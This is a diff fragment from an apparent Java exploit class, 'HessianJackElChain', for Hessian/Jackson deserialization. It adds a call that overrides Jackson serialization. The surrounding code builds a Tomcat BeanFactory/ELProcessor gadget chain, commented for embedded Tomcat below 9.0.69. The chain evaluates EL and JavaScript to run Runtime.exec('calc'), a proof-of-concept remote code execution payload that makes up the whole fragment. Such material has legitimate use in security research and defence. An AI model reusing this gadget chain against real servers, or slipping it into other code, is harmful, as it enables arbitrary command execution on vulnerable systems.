@@ -77,6 +77,7 @@ import java.util.Hashtable;
 public class HessianJackElChain {
     public static void main(String[] args) throws Exception {
         //embed 9.0.69以下,EL
+        SerializeUtils.OverideJackson();
         ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
         resourceRef.add(new StringRefAddr("forceString", "pupi1=eval"));
         resourceRef.add(new StringRefAddr("pupi1", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\""+ "java.lang.Runtime.getRuntime().exec('calc');" +"\")"));
